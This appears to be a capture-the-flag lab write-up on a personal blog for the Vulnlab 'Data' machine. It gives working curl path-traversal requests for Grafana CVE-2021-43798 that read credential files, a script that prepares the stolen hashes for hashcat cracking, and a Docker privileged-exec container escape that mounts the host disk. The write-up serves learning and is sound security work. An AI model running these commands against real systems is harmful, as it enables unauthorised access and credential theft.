<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Data (Linux Easy) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" Data starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Data (Linux Easy)",
  "url": "https://d34db33fb04h.github.io/2024/12/21/Data/",
  "image": "https://d34db33fb04h.github.io/img/data.jpg",
  "datePublished": "2024-12-22T04:57:20.000Z",
  "dateModified": "2025-05-10T16:56:18.756Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2024/12/21/Data/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Data (Linux Easy)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Data (Linux Easy)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Data (Linux Easy)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-22T04:57:20.000Z" title="Created 2024-12-21 22:57:20">2024-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-10T16:56:18.756Z" title="Updated 2025-05-10 11:56:18">2025-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vl/">vl</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/data.jpg"></p>
<p>Data starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil <code>grafana.ini</code> and <code>grafana.db</code>. Having these we can use a python script to convert this data and hashes to sha256 for hashcat. This gets us on the box as boris. Looking at his privileges we can execute <code>docker exec</code>. To get root privileges on the docker container we can run <code>sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash</code>. From here we can see the filesystem <code>df -h</code> and since we‚Äôre root we can <code>mkdir /tmp/pwnd</code> and <code>mount /dev/xXxXx /mnt/pwnd</code>. This lets us read, write, and execute on host filesystem outside the container.</p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION                                                 </span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3000/tcp open  ppp?    syn-ack ttl 62      </span><br></pre></td></tr></table></figure>

<h2 id="HTTP-Port-3000-Grafana"><a href="#HTTP-Port-3000-Grafana" class="headerlink" title="HTTP (Port 3000 - Grafana)"></a>HTTP (Port 3000 - Grafana)</h2><p>Going to this shows a login page with a version number at the bottom we can use.</p>
<p>Researching gave us <a target="_blank" rel="noopener" href="https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798">CVE-2021-43798</a>, where we can include files using Directory Traversal. So we can exfil the <code>grafana.ini</code> and the <code>grafana.db</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl --path-as-is http://10.10.89.74:3000/public/plugins/mysql/../../../../../../../../../../etc/grafana/grafana.ini -o grafana.ini</span><br><span class="line">$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db</span><br></pre></td></tr></table></figure>

<p>Looking in the <code>db</code> file we see hashes for admin and boris. We note the password, and the salt. We can use a python script to generate sha256 hashes for use so we can crack them with hashcat.</p>
<p><code>grafana.db</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `user` (                                                                          </span><br><span class="line">`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL                                                </span><br><span class="line">, `version` INTEGER NOT NULL                                                                   </span><br><span class="line">, `login` TEXT NOT NULL                                                                                                                                                                       </span><br><span class="line">, `email` TEXT NOT NULL                                                                        </span><br><span class="line">, `name` TEXT NULL                                                                                                                                                                            </span><br><span class="line">, `password` TEXT NULL                                                                         </span><br><span class="line">, `salt` TEXT NULL                                                                             </span><br><span class="line">, `rands` TEXT NULL                                                                                                                                                                           </span><br><span class="line">, `company` TEXT NULL                                                                                                                                                                         </span><br><span class="line">, `org_id` INTEGER NOT NULL                                                                                                                                                                   </span><br><span class="line">, `is_admin` INTEGER NOT NULL                                                                                                                                                                 </span><br><span class="line">, `email_verified` INTEGER NULL                                                                                                                                                               </span><br><span class="line">, `theme` TEXT NULL                                                                                                                                                                           </span><br><span class="line">, `created` DATETIME NOT NULL                                                                                                                                                                 </span><br><span class="line">, `updated` DATETIME NOT NULL                                                                                                                                                                 </span><br><span class="line">, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);                                                                          </span><br><span class="line">INSERT INTO user VALUES(1,0,&#x27;admin&#x27;,&#x27;admin@localhost&#x27;,&#x27;&#x27;,&#x27;7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&#x27;,&#x27;YObSoLj55S&#x27;,&#x27;hLLY6QQ4Y6&#x27;,&#x27;&#x27;,1</span><br><span class="line">,1,0,&#x27;&#x27;,&#x27;2022-01-23 12:48:04&#x27;,&#x27;2022-01-23 12:48:50&#x27;,0,&#x27;2022-01-23 12:48:50&#x27;,0);                                                                                                               </span><br><span class="line">INSERT INTO user VALUES(2,0,&#x27;boris&#x27;,&#x27;boris@data.vl&#x27;,&#x27;boris&#x27;,&#x27;&lt;SNIP&gt;f4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&#x27;,&#x27;&lt;SNIP&gt;&#x27;,&#x27;mYl941ma8w&#x27;,&#x27;</span><br><span class="line">&#x27;,1,0,0,&#x27;&#x27;,&#x27;2022-01-23 12:49:11&#x27;,&#x27;2022-01-23 12:49:11&#x27;,0,&#x27;2012-01-23 12:49:11&#x27;,0);</span><br></pre></td></tr></table></figure>

<p><code>decryptor.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def calculate_hash(password, salt):</span><br><span class="line">    decoded_hash = bytes.fromhex(password)</span><br><span class="line">    salt_base64 = base64.b64encode(salt.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    hash_base64 = base64.b64encode(decoded_hash).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    return f&#x27;sha256:10000:&#123;salt_base64&#125;:&#123;hash_base64&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># boris</span><br><span class="line">boris_password = &quot;&lt;SNIP&gt;34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&quot;</span><br><span class="line">boris_salt = &quot;&lt;SNIP&gt;&quot;</span><br><span class="line">boris_hash = calculate_hash(boris_password, boris_salt)</span><br><span class="line"></span><br><span class="line"># admin</span><br><span class="line">admin_password = &quot;&lt;SNIP&gt;5cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&quot;</span><br><span class="line">admin_salt = &quot;&lt;SNIP&gt;&quot;</span><br><span class="line">admin_hash = calculate_hash(admin_password, admin_salt)</span><br><span class="line"></span><br><span class="line">print(f&quot;[+] Boris hash: &#123;boris_hash&#125;&quot;)</span><br><span class="line">print(f&quot;[+] Admin hash: &#123;admin_hash&#125;&quot;)</span><br><span class="line"></span><br><span class="line">with open(&quot;hashes.txt&quot;, &quot;w&quot;) as file:</span><br><span class="line">    file.write(boris_hash + &quot;\n&quot;)</span><br><span class="line">    file.write(admin_hash + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<p>Running this script gave us hashes we can run through hashcat. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Boris hash: sha256:10000:&lt;REDACTED&gt;:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=</span><br><span class="line">[+] Admin hash: sha256:10000:&lt;REDACTED&gt;:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=</span><br></pre></td></tr></table></figure>
<p>Hashcat reveals a cleartext password for boris.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hashcat (v6.2.6) starting in autodetect mode                                                                                                                                                                                                                                         </span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">10900 | PBKDF2-HMAC-SHA256 | Generic KDF                   </span><br><span class="line"></span><br><span class="line">Dictionary cache hit:            </span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:&lt;REDATED&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/great.gif"></p>
<p>We can login to the site, but we can also ssh in as boris.</p>
<h2 id="Shell-as-boris"><a href="#Shell-as-boris" class="headerlink" title="Shell as boris"></a>Shell as boris</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh boris@data.vl  </span><br><span class="line">boris@data.vl&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254</span><br><span class="line">boris@ip-10-10-10-11:~$</span><br></pre></td></tr></table></figure>
<p>Doing some manual enumeration we find docker running, we can confirm by looking for a socket(usually &#x2F;run&#x2F;docker.sock). We also can see if we can read&#x2F;write to it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            476M     0  476M   0% /dev</span><br><span class="line">tmpfs            98M  876K   98M   1% /run</span><br><span class="line">/dev/xvda1      7.7G  1.6G  6.2G  20% /</span><br><span class="line">tmpfs           490M     0  490M   0% /dev/shm</span><br><span class="line">tmpfs           5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs           490M     0  490M   0% /sys/fs/cgroup</span><br><span class="line">/dev/loop0       25M   25M     0 100% /snap/amazon-ssm-agent/4046</span><br><span class="line">/dev/loop1       56M   56M     0 100% /snap/core18/2253</span><br><span class="line">/dev/loop2       43M   43M     0 100% /snap/snapd/14066</span><br><span class="line">/dev/loop3      117M  117M     0 100% /snap/docker/1125</span><br><span class="line">tmpfs            98M     0   98M   0% /run/user/1001</span><br><span class="line">boris@ip-10-10-10-11:~$ find / -iname docker.sock 2&gt;/dev/null</span><br><span class="line">/run/docker.sock</span><br><span class="line">boris@ip-10-10-10-11:~$ ls -lsa /run/docker.sock</span><br><span class="line">0 srw-rw---- 1 root root 0 Dec 22 15:31 /run/docker.sock</span><br><span class="line">boris@ip-10-10-10-11:~$ </span><br></pre></td></tr></table></figure>
<p>We can look at his permissions and see we can use docker as well with root privileges.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ sudo -l</span><br><span class="line">Matching Defaults entries for boris on ip-10-10-10-11:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User boris may run the following commands on ip-10-10-10-11:</span><br><span class="line">    (root) NOPASSWD: /snap/bin/docker exec *</span><br></pre></td></tr></table></figure>

<h2 id="Docker-PrivEsc"><a href="#Docker-PrivEsc" class="headerlink" title="Docker PrivEsc"></a>Docker PrivEsc</h2><p>We can use docker to escalate our privilege. We know the docker container running is <code>grafana</code>. We can use the <code>--privileged</code> flag to create a misconfig that will allow us to access the host filesystem. Also setting our <code>-u</code> to 0 (root user).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash</span><br><span class="line">bash-5.1# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
<p>Looking at the filesystem once again. We have <code>xvda1</code> we can mount to, this being to the filesystem the docker container is using.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# df -h</span><br><span class="line">Filesystem                Size      Used Available Use% Mounted on</span><br><span class="line">overlay                   7.7G      1.5G      6.2G  20% /</span><br><span class="line">tmpfs                    64.0M         0     64.0M   0% /dev</span><br><span class="line">tmpfs                   489.3M         0    489.3M   0% /sys/fs/cgroup</span><br><span class="line">shm                      64.0M         0     64.0M   0% /dev/shm</span><br><span class="line">/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/resolv.conf</span><br><span class="line">/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hostname</span><br><span class="line">/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hosts </span><br></pre></td></tr></table></figure>
<p>Let‚Äôs create a folder and mount it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# mkdir /tmp/pwnd</span><br><span class="line">bash-5.1# mount /dev/xvda1 /tmp/pwnd</span><br><span class="line">bash-5.1# ls -alis /tmp/pwnd/</span><br><span class="line">total 104</span><br><span class="line">      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 .</span><br><span class="line"> 258310      4 drwxrwxrwt    1 root     root          4096 Dec 22 17:17 ..</span><br><span class="line">     12      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 bin</span><br><span class="line">    180      4 drwxr-xr-x    3 root     root          4096 Nov 29  2021 boot</span><br><span class="line">    192      4 drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev</span><br><span class="line">    206      4 drwxr-xr-x   91 root     root          4096 Dec 22 15:31 etc</span><br><span class="line">   1637      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 home</span><br><span class="line">  55945      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img -&gt; boot/initrd.img-5.4.0-1060-aws</span><br><span class="line">  55943      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img.old -&gt; boot/initrd.img-5.4.0-1060-aws</span><br><span class="line">   1640      4 drwxr-xr-x   20 root     root          4096 Nov 29  2021 lib</span><br><span class="line">   3837      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 lib64</span><br><span class="line">     11     16 drwx------    2 root     root         16384 Nov 29  2021 lost+found</span><br><span class="line">   3839      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 media</span><br><span class="line">   3840      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt</span><br><span class="line">   3841      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt</span><br><span class="line">   3842      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc</span><br><span class="line">   3843      4 drwx------    5 root     root          4096 Jan 23  2022 root</span><br><span class="line">   3846      4 drwxr-xr-x    5 root     root          4096 Nov 29  2021 run</span><br><span class="line">   3849      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 sbin</span><br><span class="line">   4069      4 drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap</span><br><span class="line">   4070      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv</span><br><span class="line">   4071      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys</span><br><span class="line">   4072      4 drwxrwxrwt   11 root     root          4096 Dec 22 16:49 tmp</span><br><span class="line">   4073      4 drwxr-xr-x   11 root     root          4096 Nov 29  2021 usr</span><br><span class="line">  60780      4 drwxr-xr-x   13 root     root          4096 Nov 29  2021 var</span><br><span class="line">  55944      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz -&gt; boot/vmlinuz-5.4.0-1060-aws</span><br><span class="line">  49497      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz.old -&gt; boot/vmlinuz-5.4.0-1060-aws</span><br><span class="line">bash-5.1# ls -alis /tmp/pwnd/root/</span><br><span class="line">total 28</span><br><span class="line">   3843      4 drwx------    5 root     root          4096 Jan 23  2022 .</span><br><span class="line">      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 ..</span><br><span class="line">    181      0 lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -&gt; /dev/null</span><br><span class="line"> 256239      4 drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local</span><br><span class="line">   3844      4 -rw-r--r--    1 root     root           148 Aug 17  2015 .profile</span><br><span class="line"> 256089      4 drwx------    2 root     root          4096 Jan 23  2022 .ssh</span><br><span class="line">  56047      4 -rw-r--r--    1 root     root            37 Jan 23  2022 root.txt</span><br><span class="line"> 256188      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Grafana/">Grafana</a><a class="post-meta__tags" href="/tags/Docker-Privileged-Containers/">Docker Privileged Containers</a></div><div class="post-share"><div class="social-share" data-image="/img/data.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/24/blackfield/" title="Blackfield (Windows Hard)"><img class="cover" src="/img/blackfield.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Blackfield (Windows Hard)</div></div><div class="info-2"><div class="info-item-1"> Backfield is a hard Windows machine featuring Windows and Active Directory misconfigurations. Anonymous &#x2F; Guest access to an SMB share is used to enumerate users. The user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access a SMB share containing forensics artifacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.  Nmap1234567891011121314PORT      STATE SERVICE       